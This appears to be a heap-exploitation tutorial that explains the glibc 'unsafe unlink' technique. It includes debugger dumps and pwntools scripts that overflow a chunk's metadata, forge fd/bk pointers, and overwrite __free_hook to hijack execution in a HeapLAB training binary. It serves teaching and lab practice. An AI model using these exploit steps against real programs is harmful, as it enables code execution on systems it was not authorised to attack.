---
title: "Unsafe Unlink"
categories: [Heap, Unsafe Unlink]
tags: [glibc, heap, pwn]
mermaid: true
---

## **Introduction**


Welcome to the third heap exploitation technique we’re going to cover: the **Unsafe Unlink**, a classic heap exploitation method that targets the chunk consolidation process in glibc's memory allocator. This technique allows attackers to achieve arbitrary write primitives by exploiting the unlink operation during chunk coalescing.

### What is Unlink?

**Unlink** is a fundamental operation in glibc's malloc implementation that removes a chunk from a bin (like smallbins or largebins) when chunks are consolidated. The unlink macro is responsible for maintaining the doubly-linked list structure of these bins.

**Heap Chunk Structure**

In glibc, heap chunks are managed using a structure that contains metadata and the actual user data. The metadata includes:
- `size`: The size of the chunk (including metadata).
- `prev_size`: The size of the previous chunk (if free).
- `fd` (forward pointer): Points to the next chunk in the bin.
- `bk` (backward pointer): Points to the previous chunk in the bin.

When a chunk is free, it is added to a bin, and the `fd` and `bk` pointers are used to maintain the doubly-linked list.

**The Unlink Operation**

The unlink macro is used to remove a chunk from a doubly-linked list. The macro is defined as follows:

```c
// Simplified unlink macro from glibc
#define unlink(P, BK, FD) {            
    FD = P->fd;                         
    BK = P->bk;                         
    FD->bk = BK;                        
    BK->fd = FD;                        
}
```
This operation adjusts the `fd` and `bk` pointers of neighboring chunks to remove the target chunk from the list.

The vulnerability arises when an attacker can corrupt the `fd` and `bk` pointers of a chunk. By carefully crafting these pointers, the attacker can trick the unlink operation into writing arbitrary values to arbitrary memory locations.


Let's use `demo` binary.

```c
#include <stdlib.h>

int main(int argc, char* argv[]) {
    void* a = malloc(0x88);
    void* b = malloc(0x88);

    free(b);

    b = malloc(0x88);
    malloc(0x18);

    free(a);
    free(b);

    return 0;
}
```

It allocates two chunks of 0x88 bytes size each.

On debugging in **pwndbg** we can see two chunks are allocated and we can visualize it using `vis` command

```bash
gdb ./demo
pwndbg> start
pwndbg> next 2
pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000091	................
0x602010	0x0000000000000000	0x0000000000000000	................
0x602020	0x0000000000000000	0x0000000000000000	................
0x602030	0x0000000000000000	0x0000000000000000	................
0x602040	0x0000000000000000	0x0000000000000000	................
0x602050	0x0000000000000000	0x0000000000000000	................
0x602060	0x0000000000000000	0x0000000000000000	................
0x602070	0x0000000000000000	0x0000000000000000	................
0x602080	0x0000000000000000	0x0000000000000000	................
0x602090	0x0000000000000000	0x0000000000000091	................
0x6020a0	0x0000000000000000	0x0000000000000000	................
0x6020b0	0x0000000000000000	0x0000000000000000	................
0x6020c0	0x0000000000000000	0x0000000000000000	................
0x6020d0	0x0000000000000000	0x0000000000000000	................
0x6020e0	0x0000000000000000	0x0000000000000000	................
0x6020f0	0x0000000000000000	0x0000000000000000	................
0x602100	0x0000000000000000	0x0000000000000000	................
0x602110	0x0000000000000000	0x0000000000000000	................
0x602120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk

pwndbg> p a 
$1 = (void *) 0x602010
pwndbg> p b
$2 = (void *) 0x6020a0
```

**Chunk A** is located at `0x602010`
**Chunk B** is located at `0x6020a0`

Its size field is `0x91`, indicating a chunk of size `0x90` bytes.

When Chunk B is freed, the following happens:

1. Fastbin or Unsorted Bin:
- If Chunk B qualifies for fastbins (size < `0x80` on 64-bit systems), it is placed in the fastbin list.
- If it is larger, it is placed in the unsorted bin.

2. Consolidation with Top Chunk:
- If Chunk B is adjacent to the top chunk, it is **consolidated into the top chunk** to reduce fragmentation.
- This means the top chunk's size increases by the size of Chunk B.

```bash
pwndbg> next
9	    b = malloc(0x88);
#...
```

We can see that in `vis` output that the B chunk consolidated into the top_chunk.

```bash
pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000091	................
0x602010	0x0000000000000000	0x0000000000000000	................
0x602020	0x0000000000000000	0x0000000000000000	................
0x602030	0x0000000000000000	0x0000000000000000	................
0x602040	0x0000000000000000	0x0000000000000000	................
0x602050	0x0000000000000000	0x0000000000000000	................
0x602060	0x0000000000000000	0x0000000000000000	................
0x602070	0x0000000000000000	0x0000000000000000	................
0x602080	0x0000000000000000	0x0000000000000000	................
0x602090	0x0000000000000000	0x0000000000020f71	........q.......	 <-- Top chunk
```

The top chunk's size has increased from 0x20ee1 to 0x20f71.
This increase (0x20f71 - 0x20ee1 = 0x90) matches the size of Chunk B (0x90).

Since Chunk B was consolidated into the top chunk, it is not placed in any bin (fastbin, unsorted bin, etc.).

**Requesting a 0x88-byte Chunk (Chunk B):**

```bash
pwndbg> next
10	    malloc(0x18);
```

A chunk of size `0x88` is allocated and labeled as **Chunk B**.
The actual size of the chunk (including metadata) is `0x90` bytes (rounded up to the nearest multiple of 16 on 64-bit systems).

**Allocating a 0x18-byte Chunk:**

```bash
pwndbg> next
12	    free(a);
```

A smaller chunk of size `0x18` is allocated. This chunk fits into the fastbin because its size is less than 0x80 (on 64-bit systems).
The actual size of this chunk is `0x20` bytes (including metadata).

So, in total, we now have three chunks: two of size 0x90 and one of size 0x20.

```bash
pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000091	................
0x602010	0x0000000000000000	0x0000000000000000	................
0x602020	0x0000000000000000	0x0000000000000000	................
0x602030	0x0000000000000000	0x0000000000000000	................
0x602040	0x0000000000000000	0x0000000000000000	................
0x602050	0x0000000000000000	0x0000000000000000	................
0x602060	0x0000000000000000	0x0000000000000000	................
0x602070	0x0000000000000000	0x0000000000000000	................
0x602080	0x0000000000000000	0x0000000000000000	................
0x602090	0x0000000000000000	0x0000000000000091	................
0x6020a0	0x0000000000000000	0x0000000000000000	................
0x6020b0	0x0000000000000000	0x0000000000000000	................
0x6020c0	0x0000000000000000	0x0000000000000000	................
0x6020d0	0x0000000000000000	0x0000000000000000	................
0x6020e0	0x0000000000000000	0x0000000000000000	................
0x6020f0	0x0000000000000000	0x0000000000000000	................
0x602100	0x0000000000000000	0x0000000000000000	................
0x602110	0x0000000000000000	0x0000000000000000	................
0x602120	0x0000000000000000	0x0000000000000021	........!.......
0x602130	0x0000000000000000	0x0000000000000000	................
0x602140	0x0000000000000000	0x0000000000020ec1	................	 <-- Top chunk
```

**Freeing Chunk A:**

- **Chunk A** (previously allocated) is freed.
- The `PREV_INUSE` flag of Chunk B is cleared, indicating that Chunk A is no longer in use.

```bash
pwndbg> next 
13	    free(b);

pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000091	................	 <-- unsortedbin[all][0]
0x602010	0x00007ffff7bb4bc0	0x00007ffff7bb4bc0	.K.......K......
0x602020	0x0000000000000000	0x0000000000000000	................
0x602030	0x0000000000000000	0x0000000000000000	................
0x602040	0x0000000000000000	0x0000000000000000	................
0x602050	0x0000000000000000	0x0000000000000000	................
0x602060	0x0000000000000000	0x0000000000000000	................
0x602070	0x0000000000000000	0x0000000000000000	................
0x602080	0x0000000000000000	0x0000000000000000	................
0x602090	0x0000000000000090	0x0000000000000090	................
0x6020a0	0x0000000000000000	0x0000000000000000	................
0x6020b0	0x0000000000000000	0x0000000000000000	................
0x6020c0	0x0000000000000000	0x0000000000000000	................
0x6020d0	0x0000000000000000	0x0000000000000000	................
0x6020e0	0x0000000000000000	0x0000000000000000	................
0x6020f0	0x0000000000000000	0x0000000000000000	................
0x602100	0x0000000000000000	0x0000000000000000	................
0x602110	0x0000000000000000	0x0000000000000000	................
0x602120	0x0000000000000000	0x0000000000000021	........!.......
0x602130	0x0000000000000000	0x0000000000000000	................
0x602140	0x0000000000000000	0x0000000000020ec1	................	 <-- Top chunk

pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x602000
Size: 0x90 (with flag bits: 0x91)
fd: 0x7ffff7bb4bc0
bk: 0x7ffff7bb4bc0

Allocated chunk
Addr: 0x602090
Size: 0x90 (with flag bits: 0x90)

Allocated chunk | PREV_INUSE
Addr: 0x602120
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x602140
Size: 0x20ec0 (with flag bits: 0x20ec1)

pwndbg> unsortedbin 
unsortedbin
all: 0x602000 —▸ 0x7ffff7bb4bc0 (main_arena+96) ◂— 0x602000

```

**Key Observations**

1. Chunk A in Unsorted Bin:
- Chunk A (at `0x602000`) is freed and placed in the unsorted bin.
- Its `fd` and `bk` pointers point to the main arena's unsorted bin (`0x7ffff7bb4bc0`).

2. Chunk B:
- Chunk B (at `0x602090`) is still allocated.
- Its `PREV_INUSE` flag is cleared (`0x90`), indicating that the previous chunk (**Chunk A**) is free.

3. Small Chunk in Fastbin:
- The `0x18`-byte chunk (at `0x602120`) is allocated and fits into the **fastbin**.
- Its size is `0x20` bytes (including metadata), and the `PREV_INUSE` flag is set (`0x21`).

4. Top Chunk:
- The top chunk (at `0x602140`) remains unchanged, with a size of `0x20ec0`.

You can dump the arena using `main_arena`, just like we did earlier with `fastbins`.

```bash
pwndbg> dq &main_arena 20
00007ffff7bb4b60     0000000000000000 0000000000000000
00007ffff7bb4b70     0000000000000000 0000000000000000
00007ffff7bb4b80     0000000000000000 0000000000000000
00007ffff7bb4b90     0000000000000000 0000000000000000
00007ffff7bb4ba0     0000000000000000 0000000000000000
00007ffff7bb4bb0     0000000000000000 0000000000000000
00007ffff7bb4bc0     0000000000602140 0000000000000000
00007ffff7bb4bd0     0000000000602000 0000000000602000
00007ffff7bb4be0     00007ffff7bb4bd0 00007ffff7bb4bd0
00007ffff7bb4bf0     00007ffff7bb4be0 00007ffff7bb4be0
```

When Chunk B is freed, the following occurs:

```bash
pwndbg> next
15	    return 0;
#..

pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000121	........!.......	 <-- unsortedbin[all][0]
0x602010	0x00007ffff7bb4bc0	0x00007ffff7bb4bc0	.K.......K......
0x602020	0x0000000000000000	0x0000000000000000	................
0x602030	0x0000000000000000	0x0000000000000000	................
0x602040	0x0000000000000000	0x0000000000000000	................
0x602050	0x0000000000000000	0x0000000000000000	................
0x602060	0x0000000000000000	0x0000000000000000	................
0x602070	0x0000000000000000	0x0000000000000000	................
0x602080	0x0000000000000000	0x0000000000000000	................
0x602090	0x0000000000000090	0x0000000000000090	................
0x6020a0	0x0000000000000000	0x0000000000000000	................
0x6020b0	0x0000000000000000	0x0000000000000000	................
0x6020c0	0x0000000000000000	0x0000000000000000	................
0x6020d0	0x0000000000000000	0x0000000000000000	................
0x6020e0	0x0000000000000000	0x0000000000000000	................
0x6020f0	0x0000000000000000	0x0000000000000000	................
0x602100	0x0000000000000000	0x0000000000000000	................
0x602110	0x0000000000000000	0x0000000000000000	................
0x602120	0x0000000000000120	0x0000000000000020	 ....... .......
0x602130	0x0000000000000000	0x0000000000000000	................
0x602140	0x0000000000000000	0x0000000000020ec1	................	 <-- Top chunk

```

Coalescing with Chunk A:

- **Chunk B** is adjacent to **Chunk A**, which is already free.
- The two chunks are merged into a single larger free chunk of size `0x120` bytes (`0x90` + `0x90`).

Placement in Unsorted Bin:

- The merged chunk is placed in the **unsorted bin** for future reuse.

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x602000 —▸ 0x7ffff7bb4bc0 (main_arena+96) ◂— 0x602000

```

Unlike fastbins, there is only one unsorted bin per arena in glibc's memory allocator and it is doubly linked circular list.

The first quad word of user data has been filled with `fd` and `bk`.

You can also verify the size of Unsorted bin in fastbin's chunk

```bash
#...
0x602120	0x0000000000000120	0x0000000000000020	 ....... .......
0x602130	0x0000000000000000	0x0000000000000000	................
0x602140	0x0000000000000000	0x0000000000020ec1	................	 <-- Top chunk
```

mchunk_prev_size = 0x120
mchunk_size = 0x20

The interesting part comes from the **unlink** process:

We'll revise it again.

```c
#define unlink(P, BK, FD)
{
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;
}
```

![unlink](https://tc.gts3.org/cs6265/2019/tut/img/heap/heap-unlink.svg)

[*Source*](https://tc.gts3.org/cs6265/2019/tut/tut09-02-advheap.html)


The main idea of this exploitation technique is to trick `free()` to unlink the second chunk (**p2**) from free list so that we can achieve arbitrary write.

`unlink` is a macro defined to remove a victim chunk from a bin. Above is a simplified version of `unlink`. Essentially it is adjusting the `fd` and `bk` of neighboring chunks to take the victim chunk (p2) off the free list by P->fd->bk = P->bk and P->bk->fd = P->fd.

If we think carefully, the attacker can craft the `fd` and `bk` of the second chunk (p2) and achieve arbitrary write when it's unlinked. 

## Exploitation Steps

In our target binary, you can request small chunks only - excluding fast sizes (120 < bytes <= 1000)

### 1. Allocate chunk_A and chunk_B

- Allocate **chunk_A** of size 0x100 (for example).
- Allocate **chunk_B** of size 0x100 right after **chunk_A**.

```txt
+-------------------+-------------------+
| chunk_A (0x100)   | chunk_B (0x100)   |
+-------------------+-------------------+
```


### 2. Overflow into chunk_B's Metadata

- Use a vulnerability (e.g., overflow in `chunk_A`) to overwrite `chunk_B`'s metadata.
- The metadata of `chunk_B` includes:
	- **Size field**: Contains the size of `chunk_B` and the `PREV_INUSE` flag.
	- **PREV_INUSE flag**: Indicates whether the previous chunk (`chunk_A`) is in use (1) or free (0).

Overwrite `chunk_B`'s metadata to:
- Set the `PREV_INUSE` flag to `0` (indicating `chunk_A` is free).
- Optionally, forge a fake `prev_size` field to point to a fake chunk.

### 3. Free `chunk_B`

- When you free `chunk_B`, the allocator will check the `PREV_INUSE` flag.
- Since you set `PREV_INUSE` to 0, the allocator will think `chunk_A` is free.
- The allocator will attempt to **consolidate** `chunk_A` and `chunk_B` into a single free chunk.

### 4. Exploit Consolidation

- During consolidation, the allocator will:
	- Remove `chunk_A` from the free list (if it was previously freed).
	- Combine `chunk_A` and `chunk_B` into a larger free chunk.

- If you control `chunk_A`'s metadata, you can manipulate the `fd` and `bk` pointers to trigger an **unsafe unlink**.

### 5. Trigger Unsafe Unlink

- If `chunk_A` is part of a doubly-linked list (e.g., in the unsorted bin), the unlink operation will occur.
- The unlink operation follows this logic:

```c
FD = P->fd;
BK = P->bk;
FD->bk = BK;
BK->fd = FD;
```

If you control `P->fd` and `P->bk`, you can write arbitrary values to memory.

Use an arbitrary write primitive (e.g., unsafe unlink, fastbin attack, tcache poisoning) to overwrite `__malloc_hook` with the address of your target function (e.g., system).

**Trigger malloc**

- Call malloc to trigger the hook and execute your target function.
- If `__malloc_hook` points to system, you can pass a string like /bin/sh as an argument to malloc to spawn a shell.

The `unlink()` macro works similarly, but the offsets for fd and bk are different due to the larger pointer sizes. Here's how the unlink() macro looks:

```c
FD = P->fd;    /* forward chunk */
BK = P->bk;    /* backward chunk */

FD->bk = BK;    /* update forward chunk's bk pointer */
BK->fd = FD;    /* updated backward chunk's fd pointer */
```

In 64-bit systems, each chunk's metadata and pointers are 8 bytes each. The layout of a chunk in memory looks like this in 32-bit systems:

| **PREV_SIZE** | **SIZE**     |
| ------------- | ------------ |
| fd (4 bytes)  | bk (4 bytes) |

- `fd` is located at an offset of 0x10 from the start of the chunk.
- `bk` is located at an offset of 0x18 from the start of the chunk.

Note how `fd` and `bk` are written to location depending on `fd` and `bk`- if we control both `fd` and `bk`, we can get an *arbitrary write*.

We want to write the value 0x1000000c to 0x5655578c. If we had the ability to create a fake free chunk, we could choose the values for `fd` and `bk`. In this example, we would set `fd` to `0x56555780` (bear in mind the first 0x8 bytes in 32-bit would be for the metadata, so P->fd is actually 8 bytes off P and P->bk is 12 bytes off) and `bk` to 0x10000000. Then when we unlink() this fake chunk, the process is as follows:

```c
FD = P->fd         (= 0x56555780)
BK = P->bk         (= 0x10000000)

FD->bk = BK        (0x56555780 + 0xc = 0x10000000)
BK->fd = FD        (0x10000000 + 0x8 = 0x56555780)
```


This may seem like a lot to take in. It's a lot of seemingly random numbers. What you need to understand is P->fd just means 8 bytes off P and P->bk just means 12 bytes off P.

If you imagine the chunk looking like

| **PREV_SIZE** | **SIZE** |
| ------------- | -------- |
| fd            | bk       |

Then the `fd` and `bk` pointers point at the start of the chunk - prev_size. So when overwriting the `fd` pointer here:

```c
FD->bk = BK        (0x56555780 + 0xc = 0x10000000)
```

FD points to 0x56555780, and then 0xc gets added on for `bk`, making the write actually occur at 0x5655578c, which is what we wanted. That is why we fake `fd` and `bk` values lower than the actual intended write location.

In 64-bit, all the chunk data takes up 0x8 bytes each, so the offsets for `fd` and `bk` will be 0x10 and 0x18 respectively.

The slight issue with the unlink exploit is not only does `fd` get written to where you want, `bk` gets written as well - and if the location you are writing either of these to is protected memory, the binary will crash.


Now, let's get back to our target binary: `unsafe_unlink`.

When we run the binary, we are presented with the following menu:


```bash
./unsafe_unlink 

===============
|   HeapLAB   |  Unsafe Unlink
===============

puts() @ 0x738c414675a0
heap @ 0x5b6e25b9a000

1) malloc 0/2
2) edit
3) free
4) quit
> 

```

From this menu, we can see that the program allows a maximum of 2 allocations. Each allocation must satisfy the size constraint **120 < bytes ≤ 1000**, which means we cannot allocate chunks that fall into the fastbins.

I have used the following **pwntools** template for automation and exploitation -


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'unsafe_unlink')
libc = ELF(exe.libc.path, checksec=False)



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

"""
./unsafe_unlink 

===============
|   HeapLAB   |  Unsafe Unlink
===============

puts() @ 0x738c414675a0
heap @ 0x5b6e25b9a000

1) malloc 0/2
2) edit
3) free
4) quit
> 

"""

def malloc(size):
    global idx
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size:', str(size).encode())
    idx += 1   
    return idx - 1

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'data:', data)              

io = start()

io.recvuntil(b'puts() @ ')

# puts
puts = io.recvline().strip().decode()
puts = int(puts, 16)
libc.address = puts - libc.sym.puts
log.info(f'libc base: {hex(libc.address)}') 

# heap
io.recvuntil(b'heap @ ')
heap = io.recvline().strip().decode()
heap = int(heap, 16)
log.info(f'heap base: {hex(heap)}')


idx = 0

chunk_A = malloc(0x88)  # idx 0
chunk_B = malloc(0x88)  # idx 1

# Make chunk_A valid chunk
"""
0x555555603000	0x0000000000000000	0x0000000000000091	
0x555555603010	0x00000000deadbeef	0x00000000cafebabe
"""

payload = p64(0xdeadbeef) # fd
payload += p64(0xcafebabe) # bk
payload += b'A' * (0x80 - len(payload)) # padding
payload += p64(0x90) # prev_size
payload += p64(0x90) # size (prev_inuse = 0)

edit(chunk_A, payload) # overflow chunk_A into chunk_B's metadata

io.interactive()

```

On running above script with `GDB` argument -

```bash
$ ./exploit.py NOASLR GDB

# Continue in pwndbg window
pwndbg> vis

0x555555603000	0x0000000000000000	0x0000000000000091	................
0x555555603010	0x00000000deadbeef	0x00000000cafebabe	................
0x555555603020	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603030	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603040	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603050	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603060	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603070	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603080	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x555555603090	0x0000000000000090	0x0000000000000090	................
0x5555556030a0	0x0000000000000000	0x0000000000000000	................
0x5555556030b0	0x0000000000000000	0x0000000000000000	................
0x5555556030c0	0x0000000000000000	0x0000000000000000	................
0x5555556030d0	0x0000000000000000	0x0000000000000000	................
0x5555556030e0	0x0000000000000000	0x0000000000000000	................
0x5555556030f0	0x0000000000000000	0x0000000000000000	................
0x555555603100	0x0000000000000000	0x0000000000000000	................
0x555555603110	0x0000000000000000	0x0000000000000000	................
0x555555603120	0x0000000000000000	0x0000000000020ee1	................ <-- Top chunk

```

We can see that we have set `PREV_INUSE` flag of **chunk_B** to 0. When we free chunk B, the allocator detects that the previous chunk (chunk A) is free (due to the cleared `PREV_INUSE` flag), and will attempt to consolidate them. This triggers the unlink operation to remove chunk A from its bin.

We have set our `fd` -> `0xdeadbeef` and `bk` -> `0xcafebabe` in **chunk_A**.

Let's again examine what happens during the **unlink** operation:

```c
// glibc unlink macro (simplified)
#define unlink(P, BK, FD) {            
    FD = P->fd;                         // FD = 0xdeadbeef
    BK = P->bk;                         // BK = 0xcafebabe  
    FD->bk = BK;                        // Write 0xcafebabe to 0xdeadbeef + 0x18
    BK->fd = FD;                        // Write 0xdeadbeef to 0xcafebabe + 0x10
}

```

**What Actually Happens**

With our current setup:

- P->fd = 0xdeadbeef
- P->bk = 0xcafebabe

The unlink operation will attempt:

- FD->bk = BK → Write 0xcafebabe to memory address 0xdeadbeef + 0x18
- BK->fd = FD → Write 0xdeadbeef to memory address 0xcafebabe + 0x10

**The Problem with Our Current Approach**

Our current exploit will crash because:

- `0xdeadbeef + 0x18` is not a valid writable memory address
- `0xcafebabe + 0x10` is not a valid writable memory address

The binary's security protections can be checked easily using the `checksec` command provided by **pwntools**. 

```bash
$ pwn checksec unsafe_unlink

    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    RUNPATH:    b'../.glibc/glibc_2.23_unsafe-unlink'
    Stripped:   No
    Debuginfo:  Yes
```

Full RELRO is enabled on the binary so we cannot use GOT Overwrite attack.

Using `__free_hook` is often more reliable than GOT overwriting because:

- No RELRO Protection: `__free_hook` is in libc's writable data section, not affected by Full RELRO
- Natural Argument: `free()` passes the chunk pointer as the first argument - perfect for `system("/bin/sh")`
- Simple Trigger: Just call `free()` on a chunk containing `"/bin/sh"`
- Universal: Works across different binary configurations

The easiest approach is to store shellcode on the heap and make `__free_hook` point directly to it.

This works because during unlink:

- FD->bk = BK → Write shellcode_addr to `(__free_hook - 0x18) + 0x18` = `__free_hook`
- BK->fd = FD → Write `(__free_hook - 0x18)` to `shellcode_addr + 0x10`

So `__free_hook` gets overwritten with your shellcode address in one step!

I tried to overwrite `__free_hook` with `0xdeadbeef` and call it when freeing chunk.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'unsafe_unlink')
libc = ELF(exe.libc.path, checksec=False)



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

"""
./unsafe_unlink 

===============
|   HeapLAB   |  Unsafe Unlink
===============

puts() @ 0x738c414675a0
heap @ 0x5b6e25b9a000

1) malloc 0/2
2) edit
3) free
4) quit
> 

"""

def malloc(size):
    global idx
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size:', str(size).encode())
    idx += 1   
    return idx - 1

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'data:', data)              

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index:', str(idx).encode())

io = start()

io.recvuntil(b'puts() @ ')

# puts
puts = io.recvline().strip().decode()
puts = int(puts, 16)
libc.address = puts - libc.sym.puts
log.info(f'libc base: {hex(libc.address)}') 

# heap
io.recvuntil(b'heap @ ')
heap = io.recvline().strip().decode()
heap = int(heap, 16)
log.info(f'heap base: {hex(heap)}')


idx = 0

chunk_A = malloc(0x88)  # idx 0
chunk_B = malloc(0x88)  # idx 1

log.success(f'chunk_A: {chunk_A}')
log.success(f'chunk_B: {chunk_B}')

# Make chunk_A valid chunk
"""
0x555555603000	0x0000000000000000	0x0000000000000091	
0x555555603010	0x00000000deadbeef	0x00000000cafebabe
"""

# payload = p64(0xdeadbeef) # fd
# payload += p64(0xcafebabe) # bk

"""
- FD->bk = BK → Write 0xcafebabe to memory address 0xdeadbeef + 0x18
- BK->fd = FD → Write 0xdeadbeef to memory address 0xcafebabe + 0x10
"""
free_hook = libc.sym.__free_hook
log.info(f'__free_hook: {hex(free_hook)}')

payload = p64(free_hook - 0x18) # fd
payload += p64(heap + 0x20) # bk
payload += p64(0xdeadbeef) 
# payload += asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

payload += p8(0) * (0x80 - len(payload)) # padding
payload += p64(0x90) # prev_size
payload += p64(0x90) # size (prev_inuse = 0)

edit(chunk_A, payload) # overflow chunk_A into chunk_B's metadata

free(chunk_B)  # trigger unsafe unlink
# free(chunk_A)  # overwrite __free_hook with shellcode address

io.interactive()
```

Before freeing **chunk_A**, we can verify that our unsafe unlink successfully overwrote `__free_hook`:

```bash
pwndbg> p __free_hook 
$1 = (void (*)(void *, const void *)) 0x555555603020
pwndbg> dq 0x555555603020
0000555555603020     00000000deadbeef 0000000000000000
0000555555603030     00007ffff7b9b790 0000000000000000
#...

```

Perfect! The unsafe unlink operation successfully overwrote `__free_hook` with the value `0xdeadbeef`. This confirms that our exploitation technique worked as expected.

Recall what happened during the unlink:

```txt
FD = P->fd = __free_hook - 0x18
BK = P->bk = heap + 0x20

FD->bk = BK  → Write (heap + 0x20) to (__free_hook - 0x18) + 0x18 = __free_hook
BK->fd = FD  → Write (__free_hook - 0x18) to (heap + 0x20) + 0x10 = heap + 0x30
```

The first write operation successfully placed our target value (`heap + 0x20`, which contains `0xdeadbeef`) into `__free_hook`.


**Triggering the Exploit**

Now that `__free_hook` points to `0xdeadbeef`, any call to `free()` will jump to this address:

When we execute `free(chunk_A)`:

- The program calls `__free_hook` (which is now `0xdeadbeef`)
- Execution jumps to address `0xdeadbeef`
- Since `0xdeadbeef` isn't a valid executable address, the program crashes

```bash
#...
1) malloc 2/2
2) edit
3) free
4) quit
> $ 3
index: $ 0
$  
#...
```

Let's look at **pwndbg** window -

```bash
pwndbg> c
Continuing.
0x0000555555603020 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
*RAX  0x555555603020 ◂— 0xdeadbeef
 RBX  0
*RCX  0
#...
*RSP  0x7fffffffe098 —▸ 0x555555400c22 (main+792) ◂— mov rax, qword ptr [rbp - 8]
*RIP  0x555555603020 ◂— 0xdeadbeef
```

In place of `0xdeadbeef` we can use `one_gadget` or *shellcode*.


### Conclusion

The **Unsafe Unlink** technique demonstrates a critical heap exploitation primitive that transforms a simple heap overflow into arbitrary write capability. 

